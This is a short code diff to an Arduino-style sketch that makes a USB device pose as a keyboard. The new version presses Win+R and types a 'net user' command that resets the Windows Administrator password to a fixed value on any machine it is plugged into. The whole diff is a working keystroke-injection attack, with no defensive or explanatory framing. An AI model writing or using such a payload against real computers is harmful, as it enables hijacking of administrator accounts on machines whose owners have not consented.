@@ -1,14 +1,14 @@
-#include "Arduino.h"
-#include "USB.h"
-#include "USBHIDKeyboard.h"
-
+#include <USBHIDKeyboard.h>
 USBHIDKeyboard Keyboard;
 
 void setup() {
-    USB.begin();
-    Keyboard.begin();
-    delay(2000);
-    Keyboard.println("cmd /c net user administrator newpassword");
+  Keyboard.begin();
+  delay(3000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(500);
+  Keyboard.println("cmd /c net user Administrator NewP@ss123!");
 }
 
 void loop() {}
